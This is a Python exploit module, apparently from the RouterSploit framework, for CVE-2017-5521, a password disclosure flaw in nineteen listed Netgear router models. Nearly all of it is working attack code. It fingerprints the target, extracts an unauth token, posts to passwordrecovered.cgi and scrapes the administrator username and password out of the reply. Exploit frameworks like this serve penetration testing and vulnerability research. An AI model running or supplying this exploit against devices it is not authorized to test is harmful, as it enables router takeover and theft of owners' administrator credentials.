from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear Multi Password Disclosure",
        "description": "Module exploits Password Disclosure vulnerability in multiple Netgear devices. "
                       "If target is vulnerable administrator\'s password is retrieved. "
                       "This exploit only works if \'password recovery\' in router settings is OFF. "
                       "If the exploit has already been run, then it might not work anymore until device reboot.",
        "authors": (
            "Simon Kenin <Trustwave SpiderLabs>",  # vulnerability discovery
            "0BuRner",  # routersploit module
        ),
        "references": (
            "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911",
            "https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/",
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5521",
            "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5521",
            "http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability",
        ),
        "devices": (
            "Netgear D6220",
            "Netgear D6400",
            "Netgear R6200v2",
            "Netgear R6250",
            "Netgear R6300v2",
            "Netgear R6400",
            "Netgear R6700",
            "Netgear R6900",
            "Netgear R7000",
            "Netgear R7100LG",
            "Netgear R7300DST",
            "Netgear R7900",
            "Netgear R8000",
            "Netgear R8300",
            "Netgear R8500",
            "Netgear WNDR3400v2",
            "Netgear WNDR3400v3",
            "Netgear WNR3500Lv2",
            "Netgear WNDR4500v2",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            response = self.http_request(
                method="GET",
                path="/",
            )

            if response is not None:
                # Detect model
                model = response.headers.get('WWW-Authenticate')[13:-1]

                # Grab token if exists
                token = self.extract_token(response.text)
                if token is False:
                    token = "routersploit"
                    print_status("Token not found")
                else:
                    print_status("Token found: {}".format(token))

                # Detect firmware version
                response = self.http_request(
                    method="GET",
                    path="/currentsetting.htm",
                )
                fw_version = ""
                if response is not None and response.status_code == 200:
                    fw_version = self.scrape(response.text, 'Firmware=', 'RegionTag').strip('\r\n')

                print_status("Detected model: {} (FW: {})".format(model, fw_version))

                # Exploit vulnerability
                path = "/passwordrecovered.cgi?id={}".format(token)
                response = self.http_request(
                    method="POST",
                    path=path
                )

                if response.text.find('left\">') != -1:
                    username, password = self.extract_password(response.text)
                    print_success('Exploit success! login: {}, password: {}'.format(username, password))
                else:
                    print_error("Exploit failed. Could not extract credentials. Reboot your device and try again.")
            else:
                print_error("Exploit failed. Could not extract credentials.")
        else:
            print_error("Target is not vulnerable")

    @staticmethod
    def scrape(text, start_trig, end_trig):
        if text.find(start_trig) != -1:
            return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
        else:
            return False

    @staticmethod
    def extract_token(html):
        return Exploit.scrape(html, 'unauth.cgi?id=', '\"')

    @staticmethod
    def extract_password(html):
        username = (repr(Exploit.scrape(html, 'Router Admin Username</td>', '</td>')))
        username = Exploit.scrape(username, '>', '\'')
        password = (repr(Exploit.scrape(html, 'Router Admin Password</td>', '</td>')))
        password = Exploit.scrape(password, '>', '\'')
        if username is False:
            username = (Exploit.scrape(html[html.find('left\">'):-1], 'left\">', '</td>'))
            password = (Exploit.scrape(html[html.rfind('left\">'):-1], 'left\">', '</td>'))

        password = password.replace("&#35;", "#").replace("&#38;", "&")

        return username, password

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/"
        )

        if response is not None:
            header = response.headers.get('WWW-Authenticate')
            token = self.extract_token(response.text)
            return header is not None and 'NETGEAR' in header.upper() and token is not False  # target is vulnerable

        return False  # target is not vulnerable
